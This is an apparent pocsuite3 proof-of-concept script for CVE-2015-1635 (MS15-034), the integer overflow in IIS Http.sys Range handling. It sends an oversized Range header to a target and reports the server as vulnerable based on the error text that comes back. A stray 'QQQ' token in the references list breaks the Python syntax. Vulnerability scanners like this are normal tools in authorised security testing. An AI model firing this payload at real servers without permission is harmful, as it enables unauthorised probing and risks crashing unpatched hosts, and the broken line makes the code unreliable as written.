#!/usr/bin/env python
# -*- coding:utf-8 -*-

import re
from pocsuite3.api import requests as req
from pocsuite3.api import Output, POCBase, register_poc
from urllib.parse import urljoin


headers = {
    # 'Host' : 'stuff',
    'Range' : 'bytes=0-18446744073709551615'
}

def fix_url(url):
    if not url.startswith("http"):
        url = 'http://' + url
    url_new = urljoin(url,'/')
    return url_new

def url_ip_fun(url):
    compile_rule = re.compile(r'\d+[\.]\d+[\.]\d+[\.]\d+')
    url_ip = re.findall(compile_rule, url)
    return url_ip

class TestPOC(POCBase):
    vulID = 'CVE-2015-1635'
    version = '1'
    author = ['aideyisu']
    vulDate = '2020-03-19'
    createDate = '2020-03-19'
    updateDate = '2020-12-07'
    references = ['https://technet.microsoft.com/zh-cn/library/security/ms15-034',\
                  QQQ'https://www.cnblogs.com/TeaIng-Index/p/4442008.html']
    name = 'IIS系列Http.sys处理Range整数溢出漏洞(Integer Overflows)'
    appPowerLink = 'https://technet.microsoft.com/'
    appName = 'IIS'
    appVersion = 'IIS>=7.0'
    vulType = 'Integer Overflows'
    desc = '''
            Http.sys 是一个位于 Windows 操作系统核心组件，能够让任何应用程序通过它提供的接口，
            以 Http 协议进行信息通讯。微软在 Windows 2003 Server 里引进了新的 HTTP API 和内核模式驱动 Http.sys，
            目的是使基于 Http 服务的程序更有效率。其实在 Windows XP 安装 SP2 后，Http.sys 已经出现在系统里了，
            但事实上操作系统并没有真的使用这个内核级驱动，
            而 XP 上自带的 IIS 5.1 也没有使用 HTTP API。
    '''
    samples = ['']

    def _verify(self):

        result = {}
        old_url = self.url
        url_need = fix_url(old_url)
        url_ip = url_ip_fun(old_url)
        # headers['Host'] = url_ip
        r = req.get(url_need, headers=headers )
        response = r.text
        try:
            if ('Requested Range Not Satisfiable' in response):
            # if (r.status_code == 400)  and ('an invalid header name' in response):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url_need
                result['VerifyInfo']['Path'] = '/'
            else:
                result = ""
        except Exception :
            result = ""
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
        # if result['VerifyInfo']['Path']:
            output.success(result)
            # output.success('Succeed')
        else:
            output.fail('Fail test')
        return output


register_poc(TestPOC)
